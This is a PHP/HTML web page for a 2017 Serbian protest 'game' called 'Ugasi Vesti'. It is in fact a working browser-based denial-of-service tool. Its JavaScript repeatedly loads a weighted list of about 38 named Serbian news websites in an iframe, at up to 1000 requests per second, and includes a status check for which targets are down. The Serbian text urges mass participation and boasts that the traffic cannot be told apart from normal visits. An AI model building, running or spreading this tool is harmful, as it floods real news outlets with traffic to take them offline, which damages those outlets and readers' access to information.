<?php 
	$counter_name = "counter.txt";
	
	if (!file_exists($counter_name)) {
		$f = fopen($counter_name, "w");
		fwrite($f,"0");
		fclose($f);
	}

	// Read the current value of our counter file
	$f = fopen($counter_name,"r");
	$viewCount = fread($f, filesize($counter_name));
	fclose($f);
	
	//Couunt and write down
	$viewCount++;
	$f = fopen($counter_name, "w");
	fwrite($f, $viewCount);
	fclose($f); 

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
	<link rel="icon" href="logo.png">
    <link rel="shortcut icon" href="logo.png">

	<title>Igra: Ugasi Vesti | Odbrana kolektivne svesti na internetu | Srbija</title>
	
	<meta name="Description" content="U znak protesta zbog medija koji rade za interese pojedinaca, ispiraju mozak građanima namerno plasirajući vesti koje obmanjuju. Igrajmo igru. Ugasite vesti.">
	
	<meta property="og:type"               content="Game" />
	<meta property="og:title"              content="Igra: Ugasi Vesti | Odbrana kolektivne svesti na internetu | Srbija" />
	<meta property="og:description"        content="U znak protesta zbog medija koji rade za interese pojedinaca, ispiraju mozak građanima namerno plasirajući vesti koje obmanjuju. Igrajmo igru. Ugasite vesti." />
	<meta property="og:image"              content="logo.png" />

	<!-- Style -->
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
	
	
	<!-- Java Script -->
	<script src="https://code.jquery.com/jquery-3.2.1.min.js" crossorigin="anonymous"></script>
  
	<script type="text/javascript">
		//Attack variables
		var attackFrequency = 1000;
		var counter = 0;
		
		//List of websites | source: http://www.naslovi.net/izvor/
		//data | frequency - based on view public view count, alexa..
		var mediaList = {
			"http://www.alo.rs":"5",
			"http://www.blic.rs":"7",
			"http://www.b92.net":"7",
			"http://www.rts.rs":"7",
			"http://www.kurir.rs":"7",
			"http://www.politika.rs":"7",
			"http://www.pink.rs":"3",
			"http://www.informer.rs":"5",
			"http://www.novosti.rs":"4",	
			"http://www.vesti-online.com":"1",
			"http://www.telegraf.rs":"3",
			"http://www.svet.rs":"4",
			"http://studiob.rs":"2",
			"http://www.slobodnaevropa.org":"1",
			"http://www.rtv.rs":"1",
			"http://www.prva.rs":"2",
			"http://www.pressonline.rs":"3",
			"http://www.pravda.rs":"2",
			"http://www.newsweek.rs":"1",
			"http://www.nedeljnik.rs":"3",
			"http://rs.n1info.com":"5",
			"http://www.kragujevacke.rs":"1",
			"https://www.juznevesti.com":"1",
			"http://jugmedia.rs":"1",
			"http://jugpress.com":"1",
			"http://www.infokg.rs":"1",
			"http://www.ikragujevac.com":"1",
			"http://www.glaszapadnesrbije.rs":"1",
			"http://www.glasamerike.net":"3",
			"https://www.dnevnik.rs":"2",
			"http://www.bktvnews.com":"2",
			"http://www.pravda.rs":"2",
			"http://vestisrbija.rs":"1",
			"http://www.tanjug.rs":"1",
			"http://beta.rs":"1",
			"http://www.fonet.rs":"1",
			"http://www.adriamediagroup.com":"1",
			"http://www.naslovi.net":"5"
		};
			
		var mediaListGenerated = [];
		
		$(document).ready(function() {
			
			var colorR = Math.floor((Math.random() * 256));
			var colorG = Math.floor((Math.random() * 256));
			var colorB = Math.floor((Math.random() * 256));
			$("#body").css("background-color", "rgba(" + colorR + "," + colorG + "," + colorB + ", 0.4)");
			
			$("#hedenkaupaja").click(function(){
				$("#hedenkaupaja-content").slideToggle( "slow" );
			});
			
		
			//Prepare media list
			prepareMedia();
			
			//Prepare media list for view
			$.each(mediaList, function(index, item) {
				$("#media-list .pool").append('<a href="' + index + '" class="btn btn-default btn-xs">' + index.replace("http://","").replace("https://","") + '</span> ');
			});
				
			//Start ping sequence 
			$("#pingSequence").click(function(e){
				e.preventDefault();
				
				//Loop all media from generated list
				for (var i = mediaListGenerated.length - 1; i >= 0; i--) {
					ping(mediaListGenerated[i]);
				};
			});
		
			//Start/Stop attack
			$("#defendMeUs").click(function(e) {
				e.preventDefault();
				
				//Defent button control
				if($(this).hasClass("btn-danger")) {
					//Start defending
					defend = setInterval(attack, attackFrequency);	
					
					//Change back the look			
					startDefending();
				} else {				
					//StopDefending
					if(typeof defend != 'undefined'){
						clearInterval(defend);
					}
					
					//Change back the look
					stopDefending();		
				}
			});
			
			//Change frequency
			$("#attackFrequency").change(function() {
				attackFrequency = this.value;
				
				if(typeof defend != 'undefined'){
					//Stop defending
					clearInterval(defend);		
					startDefending();
				} else {
					//Change back the look			
					startDefending();
				}
				//Start Defending
				defend = setInterval(attack, attackFrequency);
			});
			
			//Remove media from list
			$(".pool a").click(function(e){
				e.preventDefault();
				
				var removedMedia = $(this).attr("href");
				
				//remove from media list
				mediaListGenerated = jQuery.grep(mediaListGenerated, function( n, i ) {
					return ( n !== removedMedia );
				});
				
				//Remove item from view
				$(this).remove();
			});
		});
		
		//Start defending function
		function startDefending(){
			//Change button
			$("#defendMeUs").html('Gašenje u toku <span class="glyphicon glyphicon-ok pull-right" aria-hidden="true"></span>');
			$("#defendMeUs").removeClass("btn-danger").addClass("btn-success");
			
			//Change labels
			$("#label-media, #label-start, #label-openpage").removeClass("hidden");
		}
		
		//Stop defending function
		function stopDefending() {
			//Change button
			$("#defendMeUs").html('Ugasi Vesti <span class="glyphicon glyphicon-play pull-right" aria-hidden="true"></span>');
			$("#defendMeUs").removeClass("btn-success").addClass("btn-danger");
			
			//Change labels
			$("#label-media, #label-start, #label-openpage").addClass("hidden");
		}
		
		function attack() {
			//Current attack
			currentAttack = mediaListGenerated[Math.floor(Math.random() * mediaListGenerated.length)];
			
			//Show as title
			$("#currentAttack").text(currentAttack.replace("http://","").replace("https://",""));
			
			//Mark in list
			$(".pool a.btn-danger").removeClass("btn-danger");
			$('.pool a[href="' + currentAttack + '"]').addClass("btn-danger");
			
			//Attack
			$("#attack-container iframe").remove();
			$("#attack-container").append('<iframe width="380" height="220" src="' + currentAttack + '" frameborder="0"></iframe>');
			
			//Count attacks
			$(".counter .label").text(counter.toLocaleString());
		   	counter++;
		}
		
		//Prepare media list. Remove items if user removed them from list and calculate frequency
		function prepareMedia() {
			//Generate media list
			$.each(mediaList, function(index, item) {
				for(var i = 0; i < item; i++) {
					mediaListGenerated.push(index);
				}
			});
		}
		
		//Check current status
		function ping(mediaUrl){
			$.ajax({
				url: mediaUrl,
				type: "GET",
				timeout: 3000,
				success: function() {
					$('.pool a[href="' + mediaUrl + '"]').removeClass("btn-default").addClass("btn-info");
				},
				error: function(x, t, m) {
					if(t == "timeout") {
						$('.pool a[href="' + mediaUrl + '"]').removeClass("btn-default, btn-info").addClass("btn-success");
					} else {
						$('.pool a[href="' + mediaUrl + '"]').removeClass("btn-default, btn-info").addClass("btn-info");
					}
				}
			});
		}
	</script>
	
	<style>
		@import url('https://fonts.googleapis.com/css?family=Open+Sans:400,600,700');
		
		body {
			font-family: 'Open Sans', sans-serif;
			font-size:13px;
			background: url("bg.png") no-repeat center top;
		}
		header {
			background-color: #ce0707;
			padding-top: 3px;
			padding-bottom: 3px;
			font-size: 10px;
			color: rgba(255, 255, 255, 0.72);
			line-height: 19px;
		}
		header a {
			font-size: 10px;
			color: rgba(255, 255, 255, 0.72);
		}
		header a:hover {
			color: #ffffff;
		}
		#notice {
			display: none;
			background-color: #000;
			padding: 20px;
			text-align: center;
			text-transfrom: uppercase;
			font-weight: bold;
			color: #fff;
		}
		#weapon {
			background-color: rgba(0, 0, 0, 0.08);
			padding-top: 40px;
			padding-bottom: 50px;
		}
		#media-list {
			background-color: rgba(0, 0, 0, 0.04);
			padding-top: 80px;
			padding-bottom: 210px;
		}
		#media-list h3 {
			background-color: rgba(255, 255, 255, 0.35);
			padding: 10px;
			border-radius: 8px;
			font-weight: bold;
			color: #ffffff;
			text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.24);
			maring-bottom: 0px !important;
		}
		#attackFrequency {
			margin-bottom: 6px;
		}
		#attack-container {
			height: 220px;
			width: 100%;
			overflow: hidden;
			background-color: #353535;
			border: 3px solid #292929;
			box-shadow: 2px 1px 3px rgba(12, 12, 12, 0.3);
			border-radius: 8px;
		}
		#chat {
			padding-top: 30px;
			padding-bottom: 30px;
		}
		#planAndGoal {
			background-color: rgba(0, 0, 0, 0.08);
			padding-top: 40px;
			padding-bottom: 50px;
		}
		#manual {
			font-size: 13px;
			color: #525252;
			padding-top: 30px;
			padding-bottom: 30px;
			background-color: rgba(255, 255, 255, 0.42);
		}
		#code {
			background-color: rgba( 210, 210, 210, .2 );
			padding-top: 30px;
			padding-bottom: 30px;
			font-size: 11px;
		}
		
		#defendMeUs {
			margin-top: 25px;
			margin-bottom: 20px;
			min-width: 220px;
		}
		
		#weapon .label {
			line-height: 30px;
			font-size: 20px;
		}
		.pool {
			background-color: rgba(255, 255, 255, 0.35);
			padding: 10px;
			border-radius: 8px;
			font-weight: bold;
			color: #ffffff;
			text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.24);
		}
		.pool a {
			margin-bottom: 7px;
			margin-right: 7px;
		}
		#hedenkaupaja {
			cursor: pointer;
		}
		#hedenkaupaja h1 {
			margin-top: 26px;
		}
		#hedenkaupaja-content {
			margin-top: 30px;
			margin-bottom: 30px;
			display: none;
		}
		#pingSequence {
			margin-top: 2px;
		}
		
		@media only screen and (max-width: 500px) {
			#notice {
				display: block;
			}
		}
		
	</style>
</head>
<body id="body">
	<header>
		<div class="container">
			<div class="pull-left">
				Igra: <strong>Ugasi Vesti</strong> | <a href="http://www.ugasivesti.tk" target="_blank">www.ugasivesti.tk</a> | <a href="https://github.com/zoranspasic1980y/hendekaupaja" target="_blank">Source Github</a> | <a href="https://github.com/zoranspasic1980y/hendekaupaja/archive/master.zip" target="_blank">Download</a>
			</div>
			<div class="pull-right">
				Ukupno pokrenuto: <strong><?php echo number_format($viewCount) ?></strong>
			</div>
		</div>
	</header>
	<div id="notice">
		Upozorenje: Igrica koristi dosta megabjata, ne preporučuje se igranje korišćenjem GPRS-a
	</div>
	<div id="weapon">
		<div class="container">
			<div class="row">
				<div class="col-md-3">
					<a href="#" class="btn btn-lg btn-default btn-danger" id="defendMeUs">
						Ugasi Vesti
						<span class="glyphicon glyphicon-play pull-right" aria-hidden="true"></span>
					</a>
				</div>
				
				<div class="col-md-3 col-md-offset-1">
					<h4>Napada u sekundi:</h4>
					<select class="form-control input-sm2" id="attackFrequency">
						<option value="1">1000</option>
						<option value="2">500</option>
						<option value="4">250</option>
						<option value="10">100</option>
						<option value="20">50</option>
						<option value="100">10</option>
						<option value="1000" selected>1</option>
					</select>
					<p class="small">
						<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> Opcija za slabije računare i internet konekciju. Promenite broj napada po potrebi.
					</p>
				</div>
				
				<div class="col-md-3 col-md-offset-1">
					<h4>Ukupno izvršenih napada:</h4>
					<div class="counter">
						<span class="label label-danger">0</span>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div id="media-list">
		<div class="container">
			<div class="row">
				<div class="col-md-8">
					<h3>Lista medija 
						 <a href="#" class="btn btn-xs btn-warning pull-right" id="pingSequence"><span class="glyphicon glyphicon-eye-open" aria-hidden="true"></span> Status</a>
					</h3>
					<div class="pool">
					
					</div>
					<br/>
					<p class="small">
						<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> Ukoliko smatrate da neki mediji dobro obavljaju svoj posao, možete ih izbaciti sa liste tako što ćete kliknuti na njih.
					</p>
					<p class="small">
						 Legenda: <span class="label label-default">Početno stanje</span> | <span class="label label-success">Ugašen sajt</span> | <span class="label label-info">Radi normalno</span> | <span class="label label-danger">Pod napadom</span>
					</p>
				</div>
				<div class="col-md-4">
					<h3 id="currentAttack">.</h3>
					<div id="attack-container">
					
					</div>
				</div>
			</div>
		</div>
	</div>	
	<!-- End media list -->
	
	<!-- Chat -->
	<div id="chat">
		<div class="container">
			<div class="row">
				<div class="col-md-6  col-md-offset-3">
					<div id="tlkio" data-channel="ugasivesti" style="width:100%;height:400px;"></div><script async src="http://tlk.io/embed.js" type="text/javascript"></script>
				</div>
			</div>
		</div>
	</div>
	<!-- End Chat -->
	
	<!-- Plan and Goal -->
	<div id="planAndGoal">
		<div  class="container">
			<div class="row">
				<div class="col-md-6">
					<h3>Koji je smisao igre?</h3>
					<p>
						Ova igrica će blokirati pristup Vašem uređaju novinskim websajtovima time što će te neprestano osvežavati njihove strane.<br/>
						Ideja je pokazati medijima da ne želimo da čitamo njihove izmišljene priče.
					</p>
					<h3>Plan igre</h3>
					<p>
						1. Pokrenite igru pokretanjem HTML fajla ili posetom nekog od websajtova.<span class="glyphicon glyphicon-ok" aria-hidden="true"></span><br/>
						2. Odaberite medije za koje smatrate da ne poštuju kodekse.<span id="label-media" class="glyphicon hidden glyphicon-ok" aria-hidden="true"></span></br>
						3. Klikom na dugme "<strong>Ugasi Vesti <span class="glyphicon glyphicon-play" aria-hidden="true"></span></strong>" pokrenite napade. <span id="label-start" class="glyphicon glyphicon-ok hidden" aria-hidden="true"></span></br>
						4. Sve dok je ova strana upaljena, napadi traju.<span id="label-openpage" class="glyphicon glyphicon-ok hidden" aria-hidden="true"></span> <br/>
						5. Nakon nekog vremena websajtovi će vas blokirati.
					</p>
					
				</div>
				
				<div class="col-md-6">
					<h3>Cilj igre</h3>
					<p>
						Mediji moraju shvatiti da su prekršili sve <a href="http://nuns.rs/codex/ethical-code.html" target="_blank">etičke kodekse</a>, dovedeno je u pitanje značenje reči "Novinar", psihička manipulacija građanima koja se sprovodi kroz medije mora prestati. </br> </br>
						Zbog toga što ne izveštavaju o realnosti već godinama, sada smo u situaciji da neko kontroliše šta ćemo čitati, reći, sanjati, uraditi. Glavni instrument diktature su mediji.</br></br>
						<strong>Mediji, sram Vas bilo.</strong> Napadi će prestati kada se izvinite svim građanima i građankama Srbije, u novinama i na televiziji. Jedno veliko izvini, od svih Vas. Vreme je da se setite zbog koga radite svoj posao. Zbog vladara iz senke ili NAS.
					</p>
					<h3>Tehničke napomene</h3>
					<p>
						Koristite wireless i LAN konekcije za napade. Igra generiše dosta protoka, u prevodu, <strong>nemojte paliti igru koristeći GPRS</strong> jer će Vam potrošiti megabajte.<br/>
					</p>
				</div>
			</div>
		</div>
	</div>
	<!-- END Plan and Goal -->
	
	<!-- Manual -->
	<div id="manual">
		<div class="container">
			<div class="row" id="hedenkaupaja">
				<div class="col-md-6">
					<img src="logo.png" class="pull-left" style="padding-right: 20px;" width="110" />
					<h1>Hendekaupaja</h1>
				</div>
			</div>
				
			<div class="row" id="hedenkaupaja-content">
				<div class="col-md-6">
					<h3>Pokretanje igre</h3>
					<p>
						Klikom na dugme "Ugasi Vesti" pokrenuće se niz poziva ka odabranim sajtovima. </br>
						Pozivi su normalni, kao kada bi otvorili stranicu sajta i pročitali vesti. </br>
							- Ovo je glavna prednost igre, odbrambeni sistemi neće moći da razlikuju normalan poziv od napada.
					</p>					
					
					<h3>Moć igre</h3>
					<p>
						Pokretanje igre i moć je u ljudima, svima nama. Što više ljudi bude upalilo igru to će ona biti jača.
					</p>					
					
					<h3>Odbrana od igre</h3>
					<p>
						Sistem će pokušati da se odbrani, privremeno ili trajno će blokirati određeni procenat ljudi.
						</br>
						Na kraju, ako svi ljudi budu blokirani, neće ostati nikog ko bi mogao da posećuje novinske sajtove. Više ne bi bilo svrhe da postoje.
					</p>				
				</div>
				
				<div class="col-md-6">			
					
					<h3>Proverite šta igra radi</h3>
					<p>
						Igra sadrži niz instrukcija. One su napisane u vidu teksta u fajlu koji predstavlja igru. Pre upotrebe pročitajte fajl, lista sajtova koju vidite kada pokrenete igru mora odgovarati tekstu koji je u fajlu.(Zbog predpostavke da svako ima pravo da menja igru i koristi na svoj način.)
					</p>	
					<h3>Kako da znam da li igra radi?</h3>
					<p>
						Dok je igra upaljena i statovana, otvorite neku od web adresa. Ukoliko je igra uključeno, verovatno nećete moći da pogledate sadržaj sajta, pojaviće se bela strana nakon 30 sekundi - minuta. U toku različitih perioda napada, nekada će sajt biti dostupan, ali usporen.
					</p>	
					<h3>Da li je ovo hakovanje?</h3>
					<p>
						Ne. Ova igra preopterećuje mrežu, terajući mehanizme odbrane sajtova da Vas blokiraju. Praktično otvarate stranu 10, 100 puta u sekundi, isti efekat bi bio ukoliko bi pritiskali brzo F5 na tastaturi dok čitate vesti.
					</p>
					
					<h3>Koliko će trajati igra?</h3>
					<p>
						Može trajati danima, mesecima. Igru bi trebalo prekinuti kada je ispunjen cilj.
					</p>
					
				</div>
			</div>
		</div>
	</div>
	<!-- END Manual -->
	
	<!-- Code -->	
	<div id="code">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					Verzija: 1.3 | Datum: 19.04.2017
					</br>
					</br>
					<span class="small">
					Uzimajte, kopirajte, pravite verzije, dopravljajte, ispravljajte, <a href="http://www.wtfpl.net/about/" target="_blank">WTFPL</a>..
					</br>Nismo strani plaćenici. Niko nije dao novac za pravljenje igre niti očekuje neku dobit. Mi smo građani Srbije, dostojanstveni i slobodni.</span>
				</div>
			</div>
		</div>
	</div>
	<!-- END Code -->
	
<!-- LICENCE | FTFPL | http://www.wtfpl.net/about/ 

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
                    Version 2, December 2004

 Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>

 Everyone is permitted to copy and distribute verbatim or modified
 copies of this license document, and changing it is allowed as long
 as the name is changed.

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. You just DO WHAT THE FUCK YOU WANT TO.
-->
</body>
</html>


